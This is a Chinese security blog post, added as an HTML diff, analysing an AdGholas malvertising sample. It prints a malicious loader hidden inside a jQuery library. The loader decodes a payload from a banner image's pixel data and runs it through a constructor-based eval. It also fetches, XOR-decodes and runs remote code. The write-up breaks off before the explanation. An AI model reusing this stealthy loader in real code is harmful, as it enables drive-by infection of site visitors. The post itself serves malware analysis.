@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>AdGholas样本分析 - 隐藏之深，难以察觉 | michael_du&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="背景介绍从Brooks那里拿到AdGholas的sample，第一眼看上去，什么都没看出来，还以为是normal sample呢。后来跟Brooks确认以后，这个sample的确是恶意的，相应的code就隐藏在library中，这才找出更多的线索，把这个sample的来龙去脉梳理清楚。
+据悉，这个sample去年6、7月份出来，目前EK中使用的不多，应该也是在尝试阶段。之所以写这篇文章，是因为从这">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AdGholas样本分析 - 隐藏之深，难以察觉">
+<meta property="og:url" content="https://michaelpdu.github.io/2017/02/07/AdGholas-sample-analysis/index.html">
+<meta property="og:site_name" content="michael_du's blog">
+<meta property="og:description" content="背景介绍从Brooks那里拿到AdGholas的sample，第一眼看上去，什么都没看出来，还以为是normal sample呢。后来跟Brooks确认以后，这个sample的确是恶意的，相应的code就隐藏在library中，这才找出更多的线索，把这个sample的来龙去脉梳理清楚。
+据悉，这个sample去年6、7月份出来，目前EK中使用的不多，应该也是在尝试阶段。之所以写这篇文章，是因为从这">
+<meta property="og:updated_time" content="2017-02-20T05:58:50.773Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="AdGholas样本分析 - 隐藏之深，难以察觉">
+<meta name="twitter:description" content="背景介绍从Brooks那里拿到AdGholas的sample，第一眼看上去，什么都没看出来，还以为是normal sample呢。后来跟Brooks确认以后，这个sample的确是恶意的，相应的code就隐藏在library中，这才找出更多的线索，把这个sample的来龙去脉梳理清楚。
+据悉，这个sample去年6、7月份出来，目前EK中使用的不多，应该也是在尝试阶段。之所以写这篇文章，是因为从这">
+  
+    <link rel="alternate" href="/atom.xml" title="michael_du&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">michael_du&#39;s blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">不想迷失在日常的工作中，在这里，记录下朝着自己的目标走过的每一个脚印。 -- “积土成山,风雨兴焉;积水成渊,蛟龙生焉”</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://michaelpdu.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-AdGholas-sample-analysis" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/02/07/AdGholas-sample-analysis/" class="article-date">
+  <time datetime="2017-02-07T01:19:34.000Z" itemprop="datePublished">2017-02-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      AdGholas样本分析 - 隐藏之深，难以察觉
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>从<a href="https://twitter.com/brooks_li" target="_blank" rel="external">Brooks</a>那里拿到AdGholas的sample，第一眼看上去，什么都没看出来，还以为是normal sample呢。后来跟Brooks确认以后，这个sample的确是恶意的，相应的code就隐藏在library中，这才找出更多的线索，把这个sample的来龙去脉梳理清楚。</p>
+<p>据悉，这个sample去年6、7月份出来，目前EK中使用的不多，应该也是在尝试阶段。之所以写这篇文章，是因为从这里，可以看到attacker为了躲避检查，做了很多隐藏的手段，而这些方法也都是许多security solution可能忽略的。</p>
+<h1 id="样本细节分析"><a href="#样本细节分析" class="headerlink" title="样本细节分析"></a>样本细节分析</h1><p>样本中的library还是挺多的，为了简单排斥掉不相干的library，去官方网站上找相应的js library，进行对比，会是一种取巧的方法。</p>
+<p>最后，定位在一个JQuery的library文件上，但是，beautify以后的libaray高达4K行，也有许多diff的地方，再加上书写的实在是太规整了，难以通过直观的判断，找出哪里是包含恶意的code。</p>
+<p>考虑到这样的code应该会有解密过程，那么，用常见的解密函数去搜索一下看看有没有什么发现，像：eval, appendChild, fromCharCode, charCodeAt等等，最后，发现了这么一段code，觉得有些异样。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line">ready: <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (!<span class="number">0</span> === a ? !--d.readyWait : !d.isReady) &#123;</div><div class="line">        <span class="keyword">if</span> (!(n.body &amp;&amp; <span class="string">"adt"</span> <span class="keyword">in</span> q)) <span class="keyword">return</span> setTimeout(d.ready, <span class="number">10</span>);</div><div class="line">        <span class="keyword">var</span> b = adt.opts;</div><div class="line">        <span class="keyword">if</span> (!(d.isReady || <span class="string">"it"</span> <span class="keyword">in</span> q) &amp;&amp; <span class="number">3</span> &lt; (<span class="string">""</span> + adt.opts.aid).length) &#123;</div><div class="line">            <span class="keyword">var</span> c = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                    <span class="keyword">var</span> a = h.offsetWidth,</div><div class="line">                        c = h.offsetHeight;</div><div class="line">                    f.width = a;</div><div class="line">                    f.height = c;</div><div class="line">                    f.style.width = a + <span class="string">"px"</span>;</div><div class="line">                    f.style.height = c + <span class="string">"px"</span>;</div><div class="line">                    g.drawImage(h, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> d = g.getImageData(<span class="number">0</span>, <span class="number">0</span>, a, c).data, a = [], e = d.length, m = <span class="number">-1</span>, c = <span class="number">3</span>; c &lt; e; c += <span class="number">4</span>) <span class="number">255</span> != d[c] &amp;&amp; (a[++m] = (~d[c] &amp; <span class="number">255</span>) / <span class="number">2</span> &amp; <span class="number">255</span>);</div><div class="line">                    d = <span class="string">""</span>;</div><div class="line">                    <span class="keyword">for</span> (c = <span class="number">0</span>; c &lt; a.length; c++) d += <span class="built_in">String</span>.fromCharCode(a[c] ^ <span class="number">22</span>);</div><div class="line">                    <span class="keyword">try</span> &#123;</div><div class="line">                        d = d.split(<span class="built_in">Array</span>(<span class="number">10</span>).join(<span class="string">"/"</span>))[<span class="number">0</span>];</div><div class="line">                        b.x = a.slice(d.length + <span class="number">9</span>);</div><div class="line">                        <span class="keyword">try</span> &#123;</div><div class="line">                            <span class="string">"constructor"</span>.constructor.constructor(d)()</div><div class="line">                        &#125; <span class="keyword">catch</span> (p) &#123;&#125;</div><div class="line">                    &#125; <span class="keyword">catch</span> (p) &#123;</div><div class="line">                        b.t.fb = <span class="number">1</span>, b.t.eh = p</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">return</span> !<span class="number">0</span></div><div class="line">                &#125;,</div><div class="line">                e = !<span class="number">1</span>,</div><div class="line">                f = n.createElement(<span class="string">"savnac"</span>.split(<span class="string">""</span>).reverse().join(<span class="string">""</span>));</div><div class="line">            <span class="keyword">if</span> (f.getContext) &#123;</div><div class="line">                <span class="keyword">var</span> g = f.getContext(<span class="string">"2d"</span>);</div><div class="line">                g.getImageData &amp;&amp; (e = !<span class="number">0</span>)</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (e) &#123;</div><div class="line">                <span class="keyword">var</span> h = n.getElementById(<span class="string">"banner"</span>).getElementsByTagName(<span class="string">"img"</span>)[<span class="number">0</span>];</div><div class="line">                <span class="keyword">if</span> (h.complete) c();</div><div class="line">                <span class="keyword">else</span> <span class="keyword">return</span> setTimeout(d.ready, <span class="number">50</span>)</div><div class="line">            &#125; <span class="keyword">else</span> b.t.fb = <span class="number">1</span>;</div><div class="line">            b.t.g = n.security ? <span class="number">1</span> : <span class="number">0</span>;</div><div class="line">            b.t.c = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> a <span class="keyword">in</span> q)</div><div class="line">                    <span class="keyword">if</span> (<span class="string">"__"</span> == a.substr(<span class="number">0</span>, <span class="number">2</span>)) <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span></div><div class="line">            &#125;();</div><div class="line">            q.it = !<span class="number">0</span>;</div><div class="line">            b.cb = <span class="function"><span class="keyword">function</span>(<span class="params">a, c, e</span>) </span>&#123;</div><div class="line">                <span class="string">"object"</span> !== <span class="keyword">typeof</span> a &amp;&amp; (a = e);</div><div class="line">                <span class="keyword">if</span> (!(<span class="number">4</span> !== a.readyState &amp;&amp; <span class="string">"error"</span> != c || <span class="string">"ld"</span> <span class="keyword">in</span> q || <span class="string">"ld2"</span> <span class="keyword">in</span> q)) &#123;</div><div class="line">                    b.cb = <span class="literal">null</span>;</div><div class="line">                    q.ld = !<span class="number">0</span>;</div><div class="line">                    a = a.status;</div><div class="line">                    c = <span class="number">200</span> &lt; a &amp;&amp; <span class="number">1E3</span> &gt; a &amp;&amp; <span class="number">400</span> !== a;</div><div class="line">                    <span class="keyword">var</span> f = <span class="string">"fb"</span> <span class="keyword">in</span> adt.ms;</div><div class="line">                    <span class="number">200</span> !== a &amp;&amp; (e = d.extend(&#123;&#125;, adt.ms), e.df = <span class="number">1</span>, c &amp;&amp; (e.df = a ^ <span class="number">200</span>), e.q = <span class="number">1</span>, adt.req(e, <span class="function"><span class="keyword">function</span>(<span class="params">a, c, d</span>) </span>&#123;</div><div class="line">                        <span class="string">"object"</span> !== <span class="keyword">typeof</span> a &amp;&amp; (a = d);</div><div class="line">                        <span class="keyword">if</span> (!(<span class="number">4</span> !== a.readyState || <span class="string">"ld2"</span> <span class="keyword">in</span> q) &amp;&amp; (q.ld2 = !<span class="number">0</span>, <span class="number">200</span> === a.status)) &#123;</div><div class="line">                            c = a.responseText;</div><div class="line">                            <span class="keyword">if</span> (a = a.getResponseHeader(<span class="string">"xhr-sid"</span>)) a = a.split(<span class="string">"-"</span>), b.k = a[<span class="number">0</span>], b.u = a[<span class="number">1</span>];</div><div class="line">                            <span class="keyword">if</span> (f &amp;&amp; c &amp;&amp; <span class="number">40</span> &lt; c.length) &#123;</div><div class="line">                                a = <span class="number">238</span>;</div><div class="line">                                d = [];</div><div class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> e = c.length; a &lt; e; d.push(c.charCodeAt(a) ^ <span class="number">225</span>), a++);</div><div class="line">                                <span class="keyword">try</span> &#123;</div><div class="line">                                    <span class="string">"constructor"</span>.constructor.constructor(<span class="built_in">String</span>.fromCharCode.apply(<span class="string">""</span>, d))()</div><div class="line">                                &#125; <span class="keyword">catch</span> (g) &#123;&#125;</div><div class="line">                            &#125;</div><div class="line">                        &#125;</div><div class="line">                    &#125;))</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        d.isReady = !<span class="number">0</span>;</div><div class="line">        !<span class="number">0</span> !== a &amp;&amp; <span class="number">0</span> &lt; --d.readyWait || (pa.resolveWith(n, [d]), d.fn.triggerHandler &amp;&amp; (d(n).triggerHandler(<span class="string">"ready"</span>), d(n).off(<span class="string">"ready"</span>)))</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>读完这段code以后，大致的逻辑是这样的：</p>
+<ul>
+<li></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://michaelpdu.github.io/2017/02/07/AdGholas-sample-analysis/" data-id="cizdpaxjd00025gzzgyclm6iu" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/样本分析/">样本分析</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2017/01/26/CVE-2016-7200-CVE-2016-7201-Edge/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CVE-2016-7200 &amp; CVE-2016-7201 (Edge)</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/flash/">flash</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/样本分析/">样本分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/翻译/">翻译</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/flash/" style="font-size: 10px;">flash</a> <a href="/tags/样本分析/" style="font-size: 20px;">样本分析</a> <a href="/tags/翻译/" style="font-size: 10px;">翻译</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">二月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">一月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">八月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/02/07/AdGholas-sample-analysis/">AdGholas样本分析 - 隐藏之深，难以察觉</a>
+          </li>
+        
+          <li>
+            <a href="/2017/01/26/CVE-2016-7200-CVE-2016-7201-Edge/">CVE-2016-7200 &amp; CVE-2016-7201 (Edge)</a>
+          </li>
+        
+          <li>
+            <a href="/2017/01/13/begin-github-blog/">开始使用GitHub写blog</a>
+          </li>
+        
+          <li>
+            <a href="/2016/08/31/thinking-of-embedded-flash-dump-in-flash-player/">利用flash player脱壳的思路</a>
+          </li>
+        
+          <li>
+            <a href="/2015/06/25/x64deepdive/">深入Windows X64调试</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 Michael Du<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
